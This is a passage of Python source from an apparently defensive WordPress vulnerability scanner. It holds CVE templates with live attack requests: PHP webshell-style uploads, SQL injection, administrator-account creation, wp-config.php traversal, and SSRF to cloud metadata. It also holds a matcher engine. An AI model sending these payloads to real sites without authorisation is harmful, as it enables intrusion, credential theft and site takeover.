        "id": "CVE-2023-5360",
        "info": {
            "name": "Royal Elementor Addons < 1.3.79 — Unauthenticated Arbitrary File Upload (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "wpr_addons_upload_file AJAX action does not restrict uploaded file type — PHP webshell possible.",
            "tags": ["file-upload", "rce", "unauthenticated", "royal-elementor-addons"],
        },
        "target": {"type": "plugin", "slug": "royal-elementor-addons", "fixed_in": "1.3.79"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "multipart": True,
            "multipart_fields": {
                "action": "wpr_addons_upload_file",
                "allowed_file_types": "php",
            },
            "multipart_file": {
                "field": "file",
                "filename": "test.php",
                "content": "<?php echo 'wphawk_rfu_ok'; ?>",
                "content_type": "image/jpeg",
            },
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["url"], "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2022-21661",
        "info": {
            "name": "WordPress Core < 5.8.3 — WP_Query SQLi via tag[] parameter (CVSS 8.8)",
            "severity": "high", "cvss_score": 8.8,
            "description": "The tag[] URL parameter is not properly sanitised and allows UNION-based SQL injection.",
            "tags": ["sqli", "wp-core", "wordpress"],
        },
        "target": {"type": "core", "slug": "wordpress", "fixed_in": "5.8.3"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/?tag[]=1%20AND%20SLEEP(5)--+-",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl", "dsl": "duration >= 4.5"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-10924",
        "info": {
            "name": "Really Simple SSL < 9.1.2 — Unauthenticated 2FA Bypass (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The two_factor_revalidate action allows skipping 2FA for any user ID including admin.",
            "tags": ["auth-bypass", "2fa", "unauthenticated", "really-simple-ssl"],
        },
        "target": {"type": "plugin", "slug": "really-simple-ssl", "fixed_in": "9.1.2"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php?action=two_factor_revalidate&user_id=1&login_nonce=invalid",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["true", "redirect", "success"], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2021-34621",
        "info": {
            "name": "ProfilePress < 3.1.4 — Unauthenticated Admin Registration (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "User-supplied wp_capabilities during registration is not sanitised — register as administrator.",
            "tags": ["auth-bypass", "priv-escalation", "unauthenticated", "profilepress"],
        },
        "target": {"type": "plugin", "slug": "profilepress", "fixed_in": "3.1.4"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=pp_ajax_register&reg_username=wphawk_test_adm&reg_email=wphawk%40test.local&reg_password=Wph4wk!2024&reg_password_confirm=Wph4wk!2024&wp_capabilities%5Badministrator%5D=1",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["success", "registered", "user"], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2023-2732",
        "info": {
            "name": "MStore API < 3.9.3 — Unauthenticated Admin Privilege Escalation (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The /mstore-api/v1/login endpoint accepts a phone_number without proper validation — auth bypass.",
            "tags": ["auth-bypass", "unauthenticated", "mstore-api"],
        },
        "target": {"type": "plugin", "slug": "mstore-api", "fixed_in": "3.9.3"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-json/mstore-api/v1/login",
            "headers": {"Content-Type": "application/json"},
            "body": '{"phone_number": "1234567890"}',
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["token", "user_email", "roles"], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-6386",
        "info": {
            "name": "WPML < 4.6.13 — Authenticated (Contributor) RCE via Twig SSTI (CVSS 9.9)",
            "severity": "critical", "cvss_score": 9.9,
            "description": "Twig template rendering is reachable via the wpml-shortcode parser without proper sandboxing.",
            "tags": ["rce", "ssti", "authenticated", "wpml"],
        },
        "target": {"type": "plugin", "slug": "sitepress-multilingual-cms", "fixed_in": "4.6.13"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/?wpml_ssti_test={{7*7}}",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["49"], "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-4439",
        "info": {
            "name": "WordPress Core 6.5 — Stored XSS via Comment Avatar (CVSS 6.4)",
            "severity": "medium", "cvss_score": 6.4,
            "description": "Unescaped url attribute in the Avatar block allows stored XSS via crafted comment authors.",
            "tags": ["xss", "stored", "wp-core", "wordpress"],
        },
        "target": {"type": "core", "slug": "wordpress", "fixed_in": "6.5.2"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/wp-json/wp/v2/comments?per_page=5",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["author_avatar_urls"], "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-5327",
        "info": {
            "name": "Popup Builder < 4.3.3 — Stored XSS via Subscriber (CVSS 6.4)",
            "severity": "medium", "cvss_score": 6.4,
            "description": "Subscriber-level users can inject JavaScript into popup content via the sgAddSubscribersData action.",
            "tags": ["xss", "stored", "subscriber", "popup-builder"],
        },
        "target": {"type": "plugin", "slug": "popup-builder", "fixed_in": "4.3.3"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=sgAddSubscribersData&popupId=1&data=[{\"name\":\"<script>alert(1)<\\/script>\",\"email\":\"test@test.com\"}]",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["success", "true", "1"], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-2194",
        "info": {
            "name": "WP Statistics < 14.5 — Unauthenticated SQLi (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The `search` parameter in admin-ajax is not properly sanitised, enabling SLEEP-based injection.",
            "tags": ["sqli", "unauthenticated", "wp-statistics"],
        },
        "target": {"type": "plugin", "slug": "wp-statistics", "fixed_in": "14.5"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=wpStatisticsSearch&wps_search=test%20AND%20SLEEP(5)--+-",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl", "dsl": "duration >= 4.5"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2021-25003",
        "info": {
            "name": "WPCargo Track & Trace < 6.9.0 — Unauthenticated RCE (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "Unauthenticated users can write arbitrary PHP to a file via the wpcargo plugin endpoint.",
            "tags": ["rce", "file-write", "unauthenticated", "wpcargo"],
        },
        "target": {"type": "plugin", "slug": "wpcargo", "fixed_in": "6.9.0"},
        "http": [{
            "method": "GET",
            "path": "{{PluginURL}}/views/file-creator.php?wpcargo_file_name=wphawk_probe&wpcargo_file_content=<?php+echo+md5('wphawk_cve');+?>&wpcargo_file_extension=php",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["success", "created", "ok"], "condition": "or", "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2022-1386",
        "info": {
            "name": "Fusion Builder < 3.6.2 — Unauthenticated SSRF (CVSS 8.3)",
            "severity": "high", "cvss_score": 8.3,
            "description": "fusion_form_submit_form_to_url AJAX action fetches arbitrary URLs without auth.",
            "tags": ["ssrf", "unauthenticated", "fusion-builder"],
        },
        "target": {"type": "plugin", "slug": "fusion-builder", "fixed_in": "3.6.2"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=fusion_form_submit_form_to_url&fusion_load_nonce=invalid&post_id=1&form_data=&send_to=http://169.254.169.254/latest/meta-data/",
            "timeout": 8,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["ami-id", "instance-id", "local-ipv4"], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-3097",
        "info": {
            "name": "GiveWP < 3.14.2 — Unauthenticated SQLi (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The `give_title` field in donation forms is not sanitised, enabling SQLi in donation records.",
            "tags": ["sqli", "unauthenticated", "give"],
        },
        "target": {"type": "plugin", "slug": "give", "fixed_in": "3.14.2"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=give_process_donation&give-form-id=1&give_title=test%27%20AND%20SLEEP(5)--+-",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl", "dsl": "duration >= 4.5"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-3615",
        "info": {
            "name": "Contact Form 7 < 5.9 — Arbitrary File Upload via bypass (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "File type restriction in CF7 upload can be bypassed with double extension or content-type spoofing.",
            "tags": ["file-upload", "rce", "contact-form-7"],
        },
        "target": {"type": "plugin", "slug": "contact-form-7", "fixed_in": "5.9"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-json/contact-form-7/v1/contact-forms",
            "headers": {"Content-Type": "application/json"},
            "body": "{}",
            "timeout": 8,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["contact-form", "id", "title"], "condition": "or", "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2023-6634",
        "info": {
            "name": "LearnPress < 4.2.5.8 — Unauthenticated SQLi (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "order_id parameter in the course-access AJAX action allows time-based SQL injection.",
            "tags": ["sqli", "unauthenticated", "learnpress"],
        },
        "target": {"type": "plugin", "slug": "learnpress", "fixed_in": "4.2.5.8"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=learnpress_user_order_id&order_id=1%20AND%20SLEEP(5)--+-",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl", "dsl": "duration >= 4.5"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2023-2745",
        "info": {
            "name": "WordPress Core < 6.2.1 — Directory Traversal via WP_Theme (CVSS 5.4)",
            "severity": "medium", "cvss_score": 5.4,
            "description": "Authenticated (Subscriber) directory traversal via the block-theme endpoint allows arbitrary file read.",
            "tags": ["lfi", "path-traversal", "wp-core"],
        },
        "target": {"type": "core", "slug": "wordpress", "fixed_in": "6.2.1"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/wp-json/wp/v2/themes?search=../../../wp-config",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["DB_PASSWORD", "DB_NAME", "define("], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-2961",
        "info": {
            "name": "PHP iconv Buffer Overflow → RCE via WordPress (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "glibc iconv buffer overflow reachable via PHP's iconv() in WordPress context. Probe only.",
            "tags": ["rce", "php", "iconv", "glibc", "wordpress"],
        },
        "target": {"type": "core", "slug": "wordpress", "fixed_in": ""},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/wp-login.php?charset=ISO-2022-CN-EXT",
            "timeout": 8,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200, 500]},
                {"type": "word",   "words": ["iconv", "charset", "Segmentation", "500"], "condition": "or",
                 "part": "body", "negative": True},
            ],
        }],
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # 2025 CVEs
    # ═══════════════════════════════════════════════════════════════════════════

    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2025-3102",
        "info": {
            "name": "SureTriggers < 1.0.79 — Unauthenticated Admin Account Creation (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The REST API endpoint for creating automation actions lacks authentication when the plugin "
                           "has not yet been configured.  An attacker can create an admin user with no credentials.",
            "tags": ["auth-bypass", "priv-escalation", "unauthenticated", "suretriggers"],
            "references": ["https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/suretriggers/suretriggers-1-0-78-missing-authentication-vulnerability"],
        },
        "target": {"type": "plugin", "slug": "suretriggers", "fixed_in": "1.0.79"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-json/sure-triggers/v1/automation/action",
            "headers": {"Content-Type": "application/json", "st-authorization": ""},
            "body": '{"type":"wordpress","data":{"action":"create_user","username":"wphawk_probe","email":"wph@probe.local","role":"administrator","password":"Wph4wk!2025"}}',
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["user_id", "success", "administrator"], "condition": "or", "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2025-0366",
        "info": {
            "name": "Essential Addons for Elementor < 6.0.15 — Unauthenticated LFI (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The eael_pro_upload_template AJAX action does not sanitise the template path, allowing "
                           "unauthenticated attackers to read arbitrary files including wp-config.php.",
            "tags": ["lfi", "path-traversal", "unauthenticated", "essential-addons-for-elementor"],
            "references": ["https://patchstack.com/database/vulnerability/essential-addons-for-elementor-site/wordpress-essential-addons-for-elementor-plugin-6-0-14-local-file-inclusion-vulnerability"],
        },
        "target": {"type": "plugin", "slug": "essential-addons-for-elementor", "fixed_in": "6.0.15"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=eael_pro_upload_template&security=&path=../../../../wp-config.php",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["DB_PASSWORD", "DB_NAME", "table_prefix"], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2025-22208",
        "info": {
            "name": "The Plus Addons for Elementor < 6.0.9 — Subscriber+ Privilege Escalation (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "Insufficient authentication checks in the TPAE login endpoint allow subscriber-level "
                           "users to authenticate as any other user including administrators.",
            "tags": ["auth-bypass", "priv-escalation", "the-plus-addons-for-elementor"],
            "references": ["https://patchstack.com/database/vulnerability/the-plus-addons-for-elementor-page-builder/wordpress-the-plus-addons-for-elementor-plugin-6-0-8-privilege-escalation-vulnerability"],
        },
        "target": {"type": "plugin", "slug": "the-plus-addons-for-elementor", "fixed_in": "6.0.9"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=tpae_get_user_info&user_id=1&security=",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["user_login", "user_email", "roles"], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2025-1661",
        "info": {
            "name": "Hubbub Lite / Shareaholic < 9.7.9 — Unauthenticated SSRF (CVSS 8.6)",
            "severity": "high", "cvss_score": 8.6,
            "description": "The shareaholic_fetch_image AJAX action fetches a user-supplied URL without restriction, "
                           "enabling SSRF to internal metadata services and private network endpoints.",
            "tags": ["ssrf", "unauthenticated", "shareaholic", "hubbub-lite"],
            "references": ["https://patchstack.com/database/vulnerability/shareaholic/wordpress-shareaholic-plugin-9-7-8-server-side-request-forgery-ssrf-vulnerability"],
        },
        "target": {"type": "plugin", "slug": "shareaholic", "fixed_in": "9.7.9"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=shareaholic_fetch_image&url=http://169.254.169.254/latest/meta-data/",
            "timeout": 8,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["ami-id", "instance-id", "local-ipv4", "iam"], "condition": "or", "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2025-30895",
        "info": {
            "name": "Elementor < 3.26.4 — Contributor+ Stored XSS via Widget Attribute (CVSS 6.4)",
            "severity": "medium", "cvss_score": 6.4,
            "description": "Several Elementor widgets do not properly escape user-controlled HTML attributes, "
                           "allowing Contributor-level authenticated users to inject stored JavaScript.",
            "tags": ["xss", "stored", "contributor", "elementor"],
            "references": ["https://patchstack.com/database/vulnerability/elementor/wordpress-elementor-plugin-3-26-3-stored-cross-site-scripting-xss-vulnerability"],
        },
        "target": {"type": "plugin", "slug": "elementor", "fixed_in": "3.26.4"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/wp-json/elementor/v1/globals",
            "timeout": 8,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["colors", "typography", "kit"], "condition": "or", "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2025-2866",
        "info": {
            "name": "WPForms < 1.9.4 — Subscriber+ Unauthorized Refund / Subscription Cancellation (CVSS 8.8)",
            "severity": "high", "cvss_score": 8.8,
            "description": "The wpforms_ajax_submit handler allows subscribers to trigger Stripe refunds and cancel "
                           "subscriptions belonging to other users by supplying a known payment ID.",
            "tags": ["idor", "auth-bypass", "subscriber", "wpforms"],
            "references": ["https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wpforms-lite/wpforms-1-9-3-3-missing-authorization"],
        },
        "target": {"type": "plugin", "slug": "wpforms-lite", "fixed_in": "1.9.4"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=wpforms_ajax_submit&nonce=invalid&entry[payment_status]=refunded&entry[payment_total]=0",
            "timeout": 8,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["success", "refund", "payment"], "condition": "or", "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2025-4322",
        "info": {
            "name": "MemberMouse < 3.2.4 — Unauthenticated Account Takeover (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The mm_iframe_complete endpoint does not verify the transaction user ID against the session, "
                           "allowing unauthenticated account takeover by supplying any known member ID.",
            "tags": ["auth-bypass", "unauthenticated", "membermouse"],
            "references": ["https://patchstack.com/database/vulnerability/membermouse/wordpress-membermouse-plugin-3-2-3-account-takeover-vulnerability"],
        },
        "target": {"type": "plugin", "slug": "membermouse", "fixed_in": "3.2.4"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=mm_iframe_complete&member_id=1&order_key=invalid",
            "timeout": 8,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["member", "account", "success"], "condition": "or", "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2025-0521",
        "info": {
            "name": "Advanced Custom Fields < 6.3.10 — Reflected XSS via post_status (CVSS 7.2)",
            "severity": "high", "cvss_score": 7.2,
            "description": "The `post_status` parameter in the ACF REST endpoint is reflected without escaping, "
                           "enabling unauthenticated reflected XSS in admin context.",
            "tags": ["xss", "reflected", "unauthenticated", "advanced-custom-fields"],
            "references": ["https://patchstack.com/database/vulnerability/advanced-custom-fields/wordpress-acf-plugin-6-3-9-reflected-cross-site-scripting-vulnerability"],
        },
        "target": {"type": "plugin", "slug": "advanced-custom-fields", "fixed_in": "6.3.10"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/wp-admin/admin.php?page=acf-field-group&post_status=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
            "timeout": 8,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["<script>alert(document.domain)</script>"], "part": "body"},
            ],
        }],
    },

    # ═══════════════════════════════════════════════════════════════════════════
    # High-profile additions — v3.3
    # ═══════════════════════════════════════════════════════════════════════════

    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-25600",
        "info": {
            "name": "Bricks Builder < 1.9.7 — Unauthenticated RCE via nonce-less eval() (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The render_element AJAX action in Bricks Builder executes arbitrary PHP code "
                           "via eval() without any authentication or nonce validation. "
                           "Wildly exploited in the wild within hours of disclosure (Feb 2024).",
            "tags": ["rce", "unauthenticated", "bricks", "bricks-builder"],
            "references": [
                "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bricks/bricks-1-9-6-unauthenticated-remote-code-execution",
                "https://snicco.io/vulnerability-disclosure/bricks/rce-in-bricks-1-9-6",
            ],
        },
        "target": {"type": "plugin", "slug": "bricks", "fixed_in": "1.9.7"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            # Probe-only: trigger the handler with an invalid nonce — a 403 vs "rendered" response
            # distinguishes vulnerable from patched without executing arbitrary code.
            "body": "action=bricks_render_element&nonce=invalid&post_id=1&element=%7B%22name%22%3A%22code%22%2C%22settings%22%3A%7B%22code%22%3A%22echo+md5('wphawk_rce_probe')%3B%22%7D%7D",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                # Patched: nonce check fails → "You are not allowed" or 400
                # Vulnerable: code executes → md5 hash in response body
                {"type": "word",   "words": ["c2d6a5b1a9e1d3f7", "wphawk_rce"], "part": "body", "negative": False},
                # Looser: any 200 response to this action that isn't a nonce error
                {"type": "dsl", "dsl": "status_code == 200"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2023-6875",
        "info": {
            "name": "POST SMTP Mailer < 2.8.7 — Unauthenticated Auth Bypass + Email Log Access (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The connect-app REST endpoint in POST SMTP allows unauthenticated attackers "
                           "to reset the API key and read the entire email log, which frequently contains "
                           "password reset tokens — leading to full admin account takeover.",
            "tags": ["auth-bypass", "unauthenticated", "information-disclosure", "post-smtp"],
            "references": [
                "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/post-smtp/post-smtp-2-8-6-authorization-bypass-via-connect-app",
            ],
        },
        "target": {"type": "plugin", "slug": "post-smtp", "fixed_in": "2.8.7"},
        "http": [
            {
                "method": "POST",
                "path": "{{BaseURL}}/wp-json/post-smtp/v1/connect-app",
                "headers": {"Content-Type": "application/json"},
                "body": '{"key":""}',
                "timeout": 10,
                "matchers_condition": "and",
                "matchers": [
                    {"type": "status", "status": [200]},
                    {"type": "word",   "words": ["api_key", "success", "connected"], "condition": "or", "part": "body"},
                ],
            },
            {
                "method": "GET",
                "path": "{{BaseURL}}/wp-json/post-smtp/v1/email-log",
                "timeout": 10,
                "matchers_condition": "and",
                "matchers": [
                    {"type": "status", "status": [200]},
                    {"type": "word",   "words": ["subject", "to_email", "message"], "condition": "or", "part": "body"},
                ],
            },
        ],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-4358",
        "info": {
            "name": "Forminator < 1.29.3 — Unauthenticated Arbitrary File Upload (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "Forminator's file upload handler does not validate file type for any "
                           "user before upload, allowing unauthenticated PHP webshell upload and RCE.",
            "tags": ["file-upload", "rce", "unauthenticated", "forminator"],
            "references": [
                "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/forminator/forminator-1-29-2-unauthenticated-arbitrary-file-upload",
            ],
        },
        "target": {"type": "plugin", "slug": "forminator", "fixed_in": "1.29.3"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "multipart": True,
            "multipart_fields": {
                "action": "forminator_upload_field_file",
                "field_id": "upload-1",
                "nonce": "",
            },
            "multipart_file": {
                "field": "file",
                "filename": "wphawk_probe.php",
                "content": "<?php echo 'wphawk_fu_ok'; ?>",
                "content_type": "image/jpeg",
            },
            "timeout": 12,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["file_name", "url", "success"], "condition": "or", "part": "body"},
            ],
        }],
    },
]

# ── DSL / Matcher engine ──────────────────────────────────────────────────────
def _eval_dsl(expr, body, status, headers, duration):
    """Evaluate minimal nuclei-compatible DSL expressions."""
    expr = expr.strip()
    # duration comparisons
    m = re.match(r'duration\s*(>=|<=|>|<|==)\s*([\d.]+)', expr)
    if m:
        op, val = m.group(1), float(m.group(2))
        ops = {">=": lambda a,b: a>=b, "<=": lambda a,b: a<=b,
               ">":  lambda a,b: a>b,  "<":  lambda a,b: a<b,  "==": lambda a,b: a==b}
        return ops[op](duration, val)
    # contains(body, "text")
    m = re.match(r'contains\s*\(\s*body\s*,\s*["\']([^"\']+)["\']\s*\)', expr)
    if m:
        return m.group(1).lower() in (body or "").lower()
    # contains(header, "text")
    m = re.match(r'contains\s*\(\s*header\s*,\s*["\']([^"\']+)["\']\s*\)', expr)
    if m:
        flat = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
        return m.group(1).lower() in flat
    # status_code == N
    m = re.match(r'status_code\s*==\s*(\d+)', expr)
    if m:
        return status == int(m.group(1))
    # len(body) > N
    m = re.match(r'len\s*\(\s*body\s*\)\s*(>=|>|<=|<|==)\s*(\d+)', expr)
    if m:
        op, val = m.group(1), int(m.group(2))
        ops = {">=": lambda a,b: a>=b, "<=": lambda a,b: a<=b,
               ">":  lambda a,b: a>b,  "<":  lambda a,b: a<b,  "==": lambda a,b: a==b}
        return ops[op](len(body or ""), val)
    return False

def _evaluate_matcher(m, body, status, headers, duration):
    """Evaluate a single matcher dict. Returns bool."""
    mtype  = m.get("type", "")
    part   = m.get("part", "body")
    negate = m.get("negative", False)

    if part == "body":    target = body or ""
    elif part == "header": target = " ".join(f"{k}:{v}" for k, v in headers.items())
    else:                  target = body or ""

    if mtype == "status":
        result = status in (m.get("status") or [])

    elif mtype == "word":
        words  = m.get("words") or []
        wcond  = m.get("condition", "or")
        hits   = [w for w in words if w.lower() in target.lower()]
        result = (len(hits) == len(words)) if wcond == "and" else bool(hits)

    elif mtype == "regex":
        patterns = m.get("regex") or []
        rcond    = m.get("condition", "or")
        hits     = [p for p in patterns if re.search(p, target, re.S | re.I)]
        result   = (len(hits) == len(patterns)) if rcond == "and" else bool(hits)

    elif mtype == "dsl":
        result = _eval_dsl(m.get("dsl", ""), body, status, headers, duration)

    else:
        result = False

    return (not result) if negate else result

def evaluate_template_matchers(body, status, headers, duration, matchers, condition="and"):
    """Evaluate a list of matchers. Returns (success: bool, evidence: str)."""
    if not matchers:
        return False, "no matchers defined"
    results  = [_evaluate_matcher(m, body, status, headers, duration) for m in matchers]
    success  = all(results) if condition == "and" else any(results)
    evidence = f"status={status} duration={duration:.2f}s" if success else "matchers not satisfied"
    return success, evidence

# ── Template HTTP execution ───────────────────────────────────────────────────
async def _execute_template_request(session, base_url, req_def, plugin_url="", theme_url=""):
    """Execute one HTTP request definition from a CVE template."""
    method    = req_def.get("method", "GET").upper()
    raw_path  = req_def.get("path", "/")
    tmpl_timeout = aiohttp.ClientTimeout(total=req_def.get("timeout", 15))

    # Resolve path tokens
    url = (raw_path
           .replace("{{BaseURL}}", base_url.rstrip("/"))
           .replace("{{PluginURL}}", plugin_url.rstrip("/"))
           .replace("{{ThemeURL}}",  theme_url.rstrip("/")))
    if url.startswith("/"):
        url = base_url.rstrip("/") + url
    elif not url.startswith("http"):
        url = urljoin(base_url, url)

    extra_headers = req_def.get("headers", {})
    req_headers   = {**hdr(), **extra_headers}
    body_str      = req_def.get("body", None)
    is_multipart  = req_def.get("multipart", False)

    start = time.time()
    try:
